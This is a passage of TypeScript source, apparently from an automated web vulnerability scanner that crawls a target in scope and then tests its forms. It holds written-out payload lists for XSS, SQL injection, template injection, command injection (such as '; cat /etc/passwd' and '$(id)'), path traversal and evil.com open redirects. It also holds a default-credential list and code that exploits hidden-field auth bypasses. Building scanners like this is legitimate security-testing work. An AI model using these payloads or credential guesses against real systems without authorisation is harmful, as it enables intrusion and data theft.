      const jsEndpointFinding = earlySourceFindings.find(f => f.type === "JS-Extracted API Endpoints");
      if (jsEndpointFinding?.payload) {
        for (const ep of jsEndpointFinding.payload.split(",").map(s => s.trim()).filter(Boolean)) {
          try {
            const resolved = ep.startsWith("http") ? ep : new URL(ep, scanTargetUrl).href;
            if (!inScope(resolved)) continue; // enforce scope — don't seed out-of-scope JS refs
            const key = `GET ${resolved}`;
            if (!discoveredEndpoints.has(key)) {
              discoveredEndpoints.set(key, { method: "GET", url: resolved, params: {} });
            }
          } catch { /* ignore */ }
        }
      }
    } catch (e) {
      console.error("[ClientSrc] Early source review failed:", (e as any).message);
    }
  }

  // Phase 0.5: server-side technology fingerprinting via Burp-proxied HEAD request
  let serverTechFindings: ServerTechFinding[] = [];
  if (scanTargetUrl) {
    try {
      setPhase("fingerprint");
      logActivity("Fingerprinting server-side technology stack");
      scanState.currentTest = "Phase 0.5/2: fingerprinting server-side tech";
      serverTechFindings = await detectServerTech(scanTargetUrl);
      if (serverTechFindings.length) {
        logActivity(`Tech stack: ${serverTechFindings.map((f) => f.name).join(", ")}`);
        console.error(`[ServerTech] Detected: ${serverTechFindings.map((f) => f.name).join(", ")}`);
      } else {
        console.error("[ServerTech] No server-side tech signals found in headers/body");
      }
    } catch (e) {
      console.error("[ServerTech] Detection failed:", (e as any).message);
    }
  }

  // Phase 1: discover all reachable features and endpoints.
  // Browser is already on the target URL from the pre-source-review navigation above.
  setPhase("crawl");
  logActivity("Crawling target to discover endpoints and attack surface");
  scanState.currentTest = "Phase 1/2: scanning features";

  // Track which endpoint keys have already had Burp tabs created (per-scan)
  const repeaterTabsCreatedThisScan = new Set<string>();
  // Endpoint tabs removed — Burp tabs are only created for confirmed FINDINGS
  // via sendFindingToBurp(). Creating one per discovered URL floods Burp.
  const flushEndpointRepeaterTabs = async () => { /* no-op */ };

  for (let depth = 0; depth < maxDepth; depth++) {
    scanState.currentTest = `Phase 1/2: capture attack surface (${depth + 1}/${maxDepth})`;
    let scanned: any = null;
    try {
      scanned = normalizeScan(await sendExtensionCommand("scan", {}, 30000));
    } catch (e: any) {
      console.error(`[Crawl] scan command failed at depth ${depth}: ${e?.message || e}. Continuing with passive checks.`);
      logActivity(`Page scan timed out (depth ${depth + 1}) — continuing crawl with what we have`);
      break;
    }
    if (!scanned?.page?.url) break;

    const pageUrl = String(scanned.page.url);
    if (!visitedUrls.has(pageUrl)) {
      visitedUrls.add(pageUrl);
      discoveredSurfaces.push(scanned);
    }
    addEndpoints(scanned);
    await flushEndpointRepeaterTabs();
    // Removed: createEndpointRepeaterTab("GET", pageUrl) — tabs only for findings

    scanState.currentTest = `Phase 1/2: trigger page features (${depth + 1}/${maxDepth})`;
    try {
      await sendExtensionCommand("trigger", { delayMs: 500, formValues: {} }, timeoutMs);
      await new Promise((resolve) => setTimeout(resolve, settleMs));
      const rescanned = normalizeScan(await sendExtensionCommand("scan", {}, 30000));
      if (rescanned?.page?.url && !visitedUrls.has(String(rescanned.page.url))) {
        visitedUrls.add(String(rescanned.page.url));
        discoveredSurfaces.push(rescanned);
      }
      addEndpoints(rescanned);
      await flushEndpointRepeaterTabs();
    } catch {
      // Keep crawling even if one trigger action fails.
    }

    // Extract all in-scope links from the current page and queue unvisited ones
    if (depth < maxDepth - 1) {
      try {
        // Extract all anchor hrefs from the page via content script
        const linkResult = await sendExtensionCommand("browser_action", {
          action: "extract_links",
          baseUrl: scanTargetUrl,
        }, 8000);
        const links: string[] = (linkResult?.links || linkResult?.result?.links || []).filter(
          (href: string) => {
            try {
              const u = new URL(href);
              const base = new URL(scanTargetUrl);
              // Only follow same-origin, non-visited links
              return u.origin === base.origin && !visitedUrls.has(href);
            } catch { return false; }
          }
        );
        for (const link of links.slice(0, 20)) { // cap at 20 new links per depth
          if (visitedUrls.has(link)) continue;
          if (!inScope(link)) { console.error(`[Scope] Out-of-scope link skipped: ${link}`); continue; }
          visitedUrls.add(link);
          // Removed: createEndpointRepeaterTab("GET", link) — tabs only for findings
          try {
            await sendExtensionCommand("browser_action", { action: "navigate", url: link }, timeoutMs);
            await new Promise((r) => setTimeout(r, settleMs));
            const linked = normalizeScan(await sendExtensionCommand("scan", {}, 20000));
            if (linked?.page?.url) {
              discoveredSurfaces.push(linked);
              addEndpoints(linked);
              await flushEndpointRepeaterTabs();
            }
          } catch {
            // Non-critical: failed to navigate to one link
          }
        }
        // Navigate back to target for next depth iteration
        if (links.length > 0) {
          try {
            await sendExtensionCommand("browser_action", { action: "navigate", url: scanTargetUrl }, timeoutMs);
            await new Promise((r) => setTimeout(r, settleMs));
          } catch { /* non-critical */ }
        }
      } catch {
        // Fall back: click first non-submit button to trigger navigation
        const buttons = scanned?.buttons || [];
        const nextButton = buttons.find((button: any) => {
          const text = `${button?.text || ""} ${button?.selector || ""}`.toLowerCase();
          return !/submit|login|sign in|log in/.test(text);
        });
        if (nextButton?.selector) {
          try {
            await sendExtensionCommand("browser_action", { action: "click", selector: nextButton.selector }, timeoutMs);
            await new Promise((r) => setTimeout(r, settleMs));
          } catch { /* non-critical */ }
        }
      }
    }
  }

  // ── Response analysis helpers ────────────────────────────────────────
  const capturePageText = async (): Promise<string> => {
    try {
      const r = await sendExtensionCommand("browser_action", { action: "extract_text", selector: "body" }, 8000);
      return String(r?.text || r?.result?.text || "");
    } catch { return ""; }
  };

  const detectSQLiErrors = (text: string, baseline: string): string | null => {
    const patterns: [RegExp, string][] = [
      [/you have an error in your sql syntax/i, "MySQL syntax error"],
      [/warning.*mysql/i, "MySQL warning"],
      [/unclosed quotation mark/i, "MSSQL unclosed quote"],
      [/quoted string not properly terminated/i, "Oracle quote error"],
      [/pg_query\(\)|postgresql.*error|psql.*error/i, "PostgreSQL error"],
      [/sqliteexception|sqlite.*error/i, "SQLite error"],
      [/ORA-\d{4,5}/i, "Oracle ORA error"],
      [/sqlstate\[/i, "SQLSTATE error"],
      [/syntax error.*near/i, "SQL near-keyword error"],
      [/microsoft ole db provider for sql/i, "MSSQL OLE DB error"],
      [/jdbc\.exception|hibernate.*exception/i, "Java SQL exception"],
    ];
    for (const [re, label] of patterns) {
      if (re.test(text) && !re.test(baseline)) return label;
    }
    return null;
  };

  const detectXSSReflection = (text: string, payload: string): string | null => {
    // Unencoded reflection
    if (text.includes(payload)) return "Payload reflected verbatim in response";
    // Partial script/event reflection
    if (/<script[\s>]/i.test(text) && !/<script[\s>]/i.test("")) return null;
    const dangerous = ["onerror=", "onload=", "onmouseover=", "javascript:", "alert(1)", "alert(document"];
    for (const d of dangerous) {
      if (text.toLowerCase().includes(d) && !text.toLowerCase().includes(`value="${d}`)) {
        return `Dangerous pattern reflected: ${d}`;
      }
    }
    return null;
  };

  // Returns true if the server HTML-encoded the XSS probe characters,
  // meaning this field is safely escaped — skip remaining XSS payloads.
  const isXSSEncoded = (postText: string, probe: string): boolean => {
    // If probe is reflected verbatim it's vulnerable, not encoded
    if (postText.includes(probe)) return false;
    // Check that the dangerous chars were entity-encoded
    const hasEncodedLt  = postText.includes("&lt;")  || postText.includes("&#60;")  || postText.includes("\\u003c");
    const hasEncodedGt  = postText.includes("&gt;")  || postText.includes("&#62;")  || postText.includes("\\u003e");
    const hasEncodedAmp = postText.includes("&amp;") || postText.includes("&#38;");
    return hasEncodedLt || (hasEncodedGt && hasEncodedAmp);
  };

  // Returns true if the server escaped/parameterized the SQLi probe character,
  // meaning the field is not injectable — skip remaining SQLi payloads.
  // Exception: 403/WAF blocks are handled separately; this only handles encoded responses.
  const isSQLiEncoded = (postText: string, baseline: string, httpStatus?: number): boolean => {
    // If server returned a WAF block we should still try bypass variants
    if (httpStatus === 403 || httpStatus === 406) return false;
    // If response is identical to baseline (input ignored / stripped silently) skip
    if (postText.trim() === baseline.trim()) return true;
    // Single-quote was HTML-entity encoded
    if (postText.includes("&#39;") || postText.includes("&#x27;") || postText.includes("&apos;")) return true;
    // Single-quote was backslash-escaped (e.g. PHP addslashes)
    if (postText.includes("\\'") || postText.includes("\\u0027")) return true;
    return false;
  };

  const detectSSTI = (text: string, baseline: string): string | null => {
    // {{7*7}} → 49, ${7*7} → 49, <%= 7*7 %> → 49
    const sstiMarkers = ["49", "7777777", "[object Object]"];
    for (const m of sstiMarkers) {
      if (text.includes(m) && !baseline.includes(m)) return `SSTI evaluation result detected: ${m}`;
    }
    return null;
  };

  const detectCMDi = (text: string, baseline: string): string | null => {
    const patterns: [RegExp, string][] = [
      [/root:.*:0:0:/m, "/etc/passwd root entry"],
      [/uid=\d+\(.*?\)\s+gid=\d+/m, "id command output"],
      [/www-data|apache|nginx|nobody/m, "webserver username"],
      [/\bwindir\b|\bwindows\b.*\bsystem32\b/i, "Windows system path"],
    ];
    for (const [re, label] of patterns) {
      if (re.test(text) && !re.test(baseline)) return label;
    }
    return null;
  };

  // ── Expanded payload sets ────────────────────────────────────────────
  // Phase 2: test discovered features (UI form attacks + Burp-proxied endpoint attacks).
  const xssPayloads = [
    "<script>alert(1)</script>",      // basic script tag
    "<img src=x onerror=alert(1)>",   // event handler
    "<svg onload=alert(1)>",           // SVG tag
    "\"><script>alert(1)</script>",   // attribute breakout
    "<details open ontoggle=alert(1)>", // WAF bypass alt tag
  ];
  const sqliPayloads = [
    "' OR '1'='1",                    // basic auth bypass
    "' OR 1=1--",                     // comment terminator
    "' UNION SELECT NULL--",          // union probe
    "' AND SLEEP(3)--",               // time-based blind
    "\" OR \"1\"=\"1",               // double-quote variant
  ];
  const sstiPayloads = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "#{7*7}",
    "*{7*7}",
  ];
  const cmdiPayloads = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "& whoami",
    "\n/bin/id",
    "%0aid",
    "; sleep 3",
  ];
  // Use provided credentials or fall back to default test credentials
  const providedCreds = Array.isArray(rawInput.credentials) && rawInput.credentials.length > 0
    ? rawInput.credentials
    : [];
  
  const defaultCreds = [
    { username: "admin", password: "admin" },
    { username: "admin", password: "password" },
    { username: "admin", password: "123456" },
    { username: "root", password: "root" },
    { username: "admin", password: "" },        // no-password check
    { username: "admin", password: "admin123" },
    { username: "test", password: "test" },
  ];
  
  // Merge provided credentials with defaults, prioritizing provided ones
  const testCreds = providedCreds.length > 0 ? [...providedCreds, ...defaultCreds] : defaultCreds;

  const estimatedFormTests = discoveredSurfaces.reduce((count, surface) => {
    const selectors = findFieldSelectors(surface);
    let total = count;
    if (skillPlan.ui.xss) total += selectors.textSelectors.length * xssPayloads.length;
    if (skillPlan.ui.sqli) total += selectors.textSelectors.length * sqliPayloads.length;
    total += selectors.textSelectors.length * sstiPayloads.length;
    total += selectors.textSelectors.length * cmdiPayloads.length;
    if (skillPlan.ui.defaultCreds && selectors.usernameSelector && selectors.passwordSelector) {
      total += defaultCreds.length;
    }
    return total;
  }, 0);

  scanState.totalTests = Math.max(1, estimatedFormTests + (discoveredEndpoints.size * 5) + 54);
  scanState.completedTests = 0;

  const passiveFindings: PassiveFinding[] = [];

  // ── Client-side source findings (collected early; merge here for reporting) ──
  passiveFindings.push(...earlySourceFindings);

  // ── Hidden field bypass exploitation ─────────────────────────────────────────
  // Source review found suspicious hidden fields — now actually exploit them so
  // the bypass is confirmed (or ruled out) rather than left as a suspicion.
  if (!scanAbortFlag) {
    const hiddenFieldHits = earlySourceFindings.filter(f => f.type === "Suspicious Hidden Form Field");
    for (const hf of hiddenFieldHits) {
      if (scanAbortFlag) break;
      // param is "hidden:mode" — extract field name and original value from payload "mode=1 (was: mode=0)"
      const fieldName = hf.param?.replace(/^hidden:/, "") ?? "";
      const wasMatch = hf.payload?.match(/was:\s*\w+=([^)]*)\)/);
      const originalValue = wasMatch ? wasMatch[1] : "0";
      const formUrl = hf.endpoint?.replace(/^POST\s+/, "") ?? scanTargetUrl;
      if (!fieldName) continue;
      // Generate bypass candidates based on original value
      const bypassValues = originalValue === "0" ? ["1", "true", "admin"] :
                           originalValue === "false" ? ["true", "1"] :
                           ["1", "true", "admin", "bypass"];
      logActivity(`Exploiting hidden field bypass: ${fieldName}=${bypassValues[0]} on ${formUrl}`);
      setPhase("hidden-field-exploit");
      const exploitFindings = await liveExploitHiddenField(formUrl, fieldName, originalValue, bypassValues);
      passiveFindings.push(...exploitFindings);
      scanState.vulnerabilities = [...passiveFindings];
    }
  }

  // ── Auth check: navigate to panel URL and see if we're already authenticated ──
  // This replaces the fragile Vue hidden-field bypass detection.
  if (!scanAbortFlag) {
    setPhase("auth-check");
    logActivity("Checking authentication status via panel navigation");
    try {
      // Use origin-only so /challenge/panel?id=1 doesn't get double-nested.
      // Always navigate to an absolute URL so the browser can't resolve it
      // relative to whatever page happens to be open.
      const targetOrigin = new URL(scanTargetUrl).origin;
      const panelUrl = targetOrigin + "/panel?id=1";
      await sendExtensionCommand("browser_action", { action: "navigate", url: panelUrl }, 10000).catch(() => {});
      await new Promise(r => setTimeout(r, 2000));
      const landed = await sendExtensionCommand("get_url", {}, 5000).catch(() => null);
      const landedUrl = String(landed?.url || landed?.result?.url || "");
      // Only treat as authenticated if still on the same origin — prevents false
      // positives when the browser happened to be on a different site.
      const isAuthenticated =
        landedUrl.startsWith(targetOrigin) &&
        landedUrl.includes("panel") &&
        !landedUrl.includes("login") &&
        !landedUrl.includes("signin") &&
        !landedUrl.includes("auth");
      if (isAuthenticated) {
        logActivity(`Authenticated session detected — running authenticated scan from ${landedUrl}`, "Panel URL loaded without redirect to login");
        scanState.currentTest = `[AUTH] Authenticated — launching deep scan from ${landedUrl}`;
        const authFindings = await runAuthenticatedScan(landedUrl, scanTargetUrl);
        passiveFindings.push(...authFindings);
        scanState.vulnerabilities = [...passiveFindings];
      } else {
        logActivity("Not authenticated — proceeding with unauthenticated scan", `Panel URL redirected to: ${landedUrl}`);
        // Navigate back to the original target
        await sendExtensionCommand("browser_action", { action: "navigate", url: scanTargetUrl }, 10000).catch(() => {});
        await new Promise(r => setTimeout(r, 1500));
      }
    } catch (authCheckErr: any) {
      console.error(`[AuthCheck] Panel nav check failed: ${authCheckErr.message}`);
    }
  }
  scanState.completedTests += 4;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A02: TLS / transport checks ─────────────────────────────────────
  setPhase("passive-checks");
  logActivity("Running passive security checks (TLS, headers, CORS, SSRF, info disclosure)");
  scanState.currentTest = "Phase 2/2: A02 — TLS/transport checks";
  try {
    const tlsFindings = await checkTLS(scanTargetUrl);
    passiveFindings.push(...tlsFindings);
    console.error(`[TLS] ${tlsFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[TLS] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A05: Security headers + clickjacking PoC ────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — security headers + clickjacking";
  try {
    const headerFindings = await checkSecurityHeaders(scanTargetUrl);
    passiveFindings.push(...headerFindings);
    console.error(`[Headers] ${headerFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[Headers] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A05: CORS misconfiguration ───────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — CORS misconfiguration";
  try {
    const corsFindings = await checkCORS(scanTargetUrl);
    passiveFindings.push(...corsFindings);
    console.error(`[CORS] ${corsFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[CORS] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A05: HTTP verb tampering ─────────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — HTTP verb tampering";
  try {
    const verbFindings = await checkHTTPVerbs(scanTargetUrl);
    passiveFindings.push(...verbFindings);
    console.error(`[Verbs] ${verbFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[Verbs] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A05: Verbose error detection ─────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — verbose error detection";
  try {
    const errorFindings = await checkVerboseErrors(scanTargetUrl);
    passiveFindings.push(...errorFindings);
    console.error(`[Errors] ${errorFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[Errors] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A10: Open redirect in URL params ─────────────────────────────────
  scanState.currentTest = "Phase 2/2: A10 — open redirect (URL params)";
  try {
    const redirectFindings = await checkOpenRedirectParams(scanTargetUrl);
    passiveFindings.push(...redirectFindings);
    console.error(`[OpenRedirect] ${redirectFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[OpenRedirect] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── A10: SSRF ─────────────────────────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A10 — SSRF probes";
  try {
    const ssrfTargets = [scanTargetUrl, ...Array.from(discoveredEndpoints.keys())];
    const ssrfFindings = await checkSSRF(scanTargetUrl, ssrfTargets.slice(1, 6));
    passiveFindings.push(...ssrfFindings);
    console.error(`[SSRF] ${ssrfFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[SSRF] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── Sensitive information disclosure ─────────────────────────────────
  scanState.currentTest = "Phase 2/2: Info disclosure — scanning response bodies + exposed files";
  try {
    const endpointUrls = Array.from(discoveredEndpoints.keys()).slice(0, 10);
    const infoFindings = await checkSensitiveInfoDisclosure(scanTargetUrl, endpointUrls);
    passiveFindings.push(...infoFindings);
    console.error(`[InfoDisclosure] ${infoFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[InfoDisclosure] Check failed:", err.message);
  }
  scanState.completedTests += 5;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── Cookie security flags ─────────────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — cookie security flags";
  try {
    const cookieFindings = await checkCookieSecurity(scanTargetUrl);
    passiveFindings.push(...cookieFindings);
    console.error(`[CookieSecurity] ${cookieFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[CookieSecurity] Check failed:", err.message);
  }
  scanState.completedTests += 3;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── Server version disclosure ─────────────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — server version disclosure";
  try {
    const versionFindings = await checkVersionDisclosure(scanTargetUrl);
    passiveFindings.push(...versionFindings);
    console.error(`[VersionDisclosure] ${versionFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[VersionDisclosure] Check failed:", err.message);
  }
  scanState.completedTests += 2;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // ── HTML comments with sensitive data ────────────────────────────────
  scanState.currentTest = "Phase 2/2: A05 — HTML comment scanning";
  try {
    const commentFindings = await checkHTMLComments(scanTargetUrl);
    passiveFindings.push(...commentFindings);
    console.error(`[HTMLComments] ${commentFindings.length} finding(s)`);
  } catch (err: any) {
    console.error("[HTMLComments] Check failed:", err.message);
  }
  scanState.completedTests += 2;
  scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);

  // Merge passive findings into scanState
  passiveFindings.forEach(f => pushVuln(f));

  // Send Medium+ passive findings to Burp Repeater so every finding has a tab
  for (const pf of passiveFindings) {
    if (["Critical", "High", "Medium"].includes(pf.severity)) {
      await sendFindingToBurp(pf.severity, pf.type, "GET", scanTargetUrl).catch(() => {});
    }
  }

  setPhase("attack");
  logActivity(`Attack surface captured — ${discoveredSurfaces.length} surface(s), ${discoveredEndpoints.size} endpoint(s). Starting active attack phase.`);
  scanState.currentTest = "Phase 2/2: running form attacks";
  const lastSurface = discoveredSurfaces[discoveredSurfaces.length - 1] || null;
  if (lastSurface?.page?.url) {
    try {
      await sendExtensionCommand("browser_action", {
        action: "navigate",
        url: lastSurface.page.url,
      }, timeoutMs);
      await new Promise((resolve) => setTimeout(resolve, settleMs));
    } catch {
      // If navigation fails, continue with current page context.
    }
  }

  // Get active surface with retry logic (extension may be reattaching after navigation)
  let activeSurface = lastSurface;
  let scanRetries = 0;
  const maxRetries = 3;
  
  while (scanRetries < maxRetries && !activeSurface) {
    try {
      scanState.currentTest = `Phase 2/2: syncing with extension (retry ${scanRetries + 1}/${maxRetries})`;
      activeSurface = normalizeScan(await sendExtensionCommand("scan", {}, 15000));
      if (activeSurface?.page?.url) break;
    } catch (error) {
      console.error(`[Scan] Scan retry ${scanRetries + 1} failed:`, String(error));
      scanRetries++;
      if (scanRetries < maxRetries) {
        await new Promise((resolve) => setTimeout(resolve, 500 * Math.pow(2, scanRetries)));
      }
    }
  }

  if (!activeSurface) {
    // Fallback: use last discovered surface or skip UI attacks
    console.error("[Scan] Phase 2 could not sync with extension, using last surface or skipping UI attacks");
    activeSurface = lastSurface || { page: { url: "", title: "" }, buttons: [], forms: [], endpoints: [], findings: [] };
    skillPlan.ui.xss = false;
    skillPlan.ui.sqli = false;
    skillPlan.ui.defaultCreds = false;
  }

  const selectors = activeSurface?.page?.url ? findFieldSelectors(activeSurface) : { textSelectors: [], usernameSelector: null, passwordSelector: null, submitSelector: null };
  const activeUrl = String(activeSurface?.page?.url || "");

  // ── Helper: smart form test ─────────────────────────────────────────
  // Navigates back to formPageUrl, uses smart_fill_form to fill ALL fields
  // with benign data + injects payload into targetSelector, submits, reads response.
  const smartFormTest = async (
    formPageUrl: string,
    targetSelector: string,
    payload: string,
    submitSelector: string
  ): Promise<{ preText: string; postText: string; postUrl: string }> => {
    // Navigate back to form page to get a clean state
    try {
      await sendExtensionCommand("browser_action", { action: "navigate", url: formPageUrl }, timeoutMs);
      await new Promise((r) => setTimeout(r, settleMs));
    } catch { /* non-critical — already on the right page */ }

    // Capture baseline state
    const preState = await sendExtensionCommand("browser_action", { action: "get_page_state" }, 5000).catch(() => null);
    const preText = String(preState?.result?.text || preState?.text || "");

    // Smart fill: all fields get benign values, target field gets payload
    await sendExtensionCommand("browser_action", {
      action: "smart_fill_form",
      targetSelector,
      payload,
    }, 8000);

    // Submit form via MCP → Burp so the attack request is guaranteed in Burp history.
    // Falls back to a direct click if the proxy endpoint is unreachable.
    let submitted = false;
    try {
      const mcpResult = await sendExtensionCommand("browser_action", {
        action: "submit_form_via_mcp",
        targetSelector,
      }, 10000);
      submitted = !!mcpResult?.ok || !!mcpResult?.result?.ok;
    } catch { /* fall through to click fallback */ }

    if (!submitted) {
      try {
        await sendExtensionCommand("browser_action", { action: "click", selector: submitSelector }, 8000);
      } catch {
        try {
          await sendExtensionCommand("browser_action", {
            action: "type",
            selector: targetSelector,
            text: "\n",
          }, 5000);
        } catch { /* skip */ }
      }
    }
    await new Promise((r) => setTimeout(r, settleMs));

    // Capture post-submission state
    const postState = await sendExtensionCommand("browser_action", { action: "get_page_state" }, 5000).catch(() => null);
    const postText = String(postState?.result?.text || postState?.text || "");
    const postUrl = String(postState?.result?.url || postState?.url || formPageUrl);

    return { preText, postText, postUrl };
  };

  // ── Discover loose inputs not inside forms (React/Vue pseudo-forms) ──
  let looseInputSelectors: string[] = [];
  let looseInputContexts: Array<{selector: string; hint: string}> = [];
  try {
    const inputScan = await sendExtensionCommand("browser_action", { action: "scan_all_inputs" }, 8000);
    const inputs: any[] = inputScan?.result?.inputs || inputScan?.inputs || [];
    // Add inputs not already covered by surface forms
    const existingSelectors = new Set(selectors.textSelectors);
    for (const inp of inputs) {
      if (!inp.inForm && inp.selector && !existingSelectors.has(inp.selector)) {
        const t = inp.type.toLowerCase();
        if (!["password", "submit", "hidden", "checkbox", "radio", "button"].includes(t)) {
          looseInputSelectors.push(inp.selector);
          looseInputContexts.push({
            selector: inp.selector,
            hint: [inp.label, inp.placeholder, inp.name, inp.id, inp.type].filter(Boolean).join(" ").toLowerCase(),
          });
          existingSelectors.add(inp.selector);
        }
      }
    }
    console.error(`[Scan] Found ${looseInputSelectors.length} additional loose inputs`);
  } catch { /* non-critical */ }

  // Merge form fields + loose inputs with full context
  const allTestFields: Array<{selector: string; hint: string}> = [
    ...((selectors as any).textFieldContexts || selectors.textSelectors.map((s: string) => ({ selector: s, hint: "" }))),
    ...looseInputContexts,
  ];

  // ── Context-aware attack loop ─────────────────────────────────────────
  // Each field is classified by name/type/label/placeholder.
  // Only relevant attack types run on each field.
  const openRedirectPayloads = [
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    "https:evil.com",
    "/\\evil.com",
  ];

  // Path traversal payloads
  const pathTraversalPayloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  ];

  if (allTestFields.length > 0) {
    for (const fieldCtx of allTestFields) {
      const selector = fieldCtx.selector;
      if (scanAbortFlag) break;

      // Skip injection attacks on login forms where a hidden-field auth bypass was already
      // confirmed for this page — injecting SQLi/XSS payloads into username/password fields
      // on such forms wastes minutes and can't improve on the bypass we already have.
      const hasHiddenFieldBypass = [...passiveFindings, ...formFindings].some(
        f => (f.type === "Suspicious Hidden Form Field" || f.type === "Auth Bypass (Hidden Field)" ||
              f.type === "Auth Bypass via Hidden Field (Confirmed)") &&
             (f.endpoint === activeUrl || f.endpoint === `POST ${activeUrl}`)
      );
      if (hasHiddenFieldBypass) {
        const hint = (fieldCtx.hint || "").toLowerCase();
        const isLoginField = /username|password|email|user|pass|login/.test(hint) ||
                             /username|password|email/.test(selector.toLowerCase());
        if (isLoginField) {
          console.error(`[Scan] Skipping injection attacks on login field ${selector} — hidden-field bypass already confirmed`);
          continue;
        }
      }

      // Classify using selector + label/placeholder hint combined for smarter attack selection
      const attackTypes = classifyField(selector + " " + (fieldCtx.hint || ""));
      console.error(`[Scan] Field ${selector} (hint: "${fieldCtx.hint}") → attacks: ${attackTypes.join(", ")}`);

      for (const attackType of attackTypes) {
        if (scanAbortFlag) break;

        if (attackType === "xss" && skillPlan.ui.xss) {
          const xssProbe = xssPayloads[0];
          let xssSkip = false;
          let xssEncoded = false;
          try {
            logActivity(`Testing XSS on ${selector}`, `Injecting XSS probe into ${selector} and checking response`);
            const { preText, postText: probePost } = await smartFormTest(activeUrl, selector, xssProbe, selectors.submitSelector);
            const xssHit = probePost.includes(xssProbe) || probePost.includes("alert(") || probePost.includes("<script");
            if (xssHit) {
              formFindings.push({ type: "XSS", severity: "High", endpoint: activeUrl, param: selector, payload: xssProbe, evidence: "Probe payload reflected in response" });
              logActivity(`XSS confirmed in ${selector}`, `Payload reflected — marking as High finding`);
              xssSkip = true;
              scanState.completedTests += xssPayloads.length;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            } else if (isXSSEncoded(probePost, xssProbe)) {
              // Field safely HTML-encodes the payload — no XSS possible, skip all remaining
              xssEncoded = true;
              xssSkip = true;
              console.error(`[Scan] Field ${selector} encodes XSS chars — skipping remaining payloads`);
              scanState.completedTests += xssPayloads.length;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          } catch (e) { console.error(`[Scan] XSS probe error ${selector}:`, String(e).slice(0, 80)); }

          if (!xssSkip) {
            for (const payload of xssPayloads.slice(1)) {
              if (scanAbortFlag) break;
              scanState.currentTest = `XSS → ${selector}`;
              try {
                const { postText, postUrl } = await smartFormTest(activeUrl, selector, payload, selectors.submitSelector);
                const evidence = detectXSSReflection(postText, payload);
                if (evidence) {
                  formFindings.push({ type: "XSS", severity: "High", endpoint: activeUrl, param: selector, payload, evidence });
                  console.error(`[Scan] ✗ XSS in ${selector}: ${evidence}`);
                  break;
                }
                // If encoded output detected mid-loop, also bail
                if (isXSSEncoded(postText, payload)) {
                  console.error(`[Scan] Encoding detected on payload #${xssPayloads.indexOf(payload)+1} for ${selector} — stopping XSS loop`);
                  break;
                }
                // Form navigated away unexpectedly — stop testing this field
                if (postUrl && postUrl !== activeUrl) break;
              } catch (e) { console.error(`[Scan] XSS test error ${selector}:`, String(e).slice(0, 80)); }
              scanState.completedTests++;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          }
        }

        if (attackType === "sqli" && skillPlan.ui.sqli) {
          const sqliProbe = sqliPayloads[0];
          let sqliSkip = false;
          try {
            logActivity(`Testing SQLi on ${selector}`, `Injecting SQL probe into ${selector}`);
            const { preText, postText: probePost } = await smartFormTest(activeUrl, selector, sqliProbe, selectors.submitSelector);
            const evidence = detectSQLiErrors(probePost, preText);
            if (evidence) {
              formFindings.push({ type: "SQL Injection", severity: "High", endpoint: activeUrl, param: selector, payload: sqliProbe, evidence });
              logActivity(`SQLi confirmed in ${selector}: ${evidence}`, `SQL error pattern detected`);
              sqliSkip = true;
              scanState.completedTests += sqliPayloads.length;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            } else if (isSQLiEncoded(probePost, preText)) {
              // Field escapes/encodes SQL chars — no injection possible, skip all remaining
              sqliSkip = true;
              console.error(`[Scan] Field ${selector} encodes SQL chars — skipping remaining SQLi payloads`);
              scanState.completedTests += sqliPayloads.length;
              scanState.progress = Math.round((scanState.completedTests / scanState.totalTests) * 100);
            }
          } catch (e) { console.error(`[Scan] SQLi probe error ${selector}:`, String(e).slice(0, 80)); }

          if (!sqliSkip) {
            for (const payload of sqliPayloads.slice(1)) {
              if (scanAbortFlag) break;
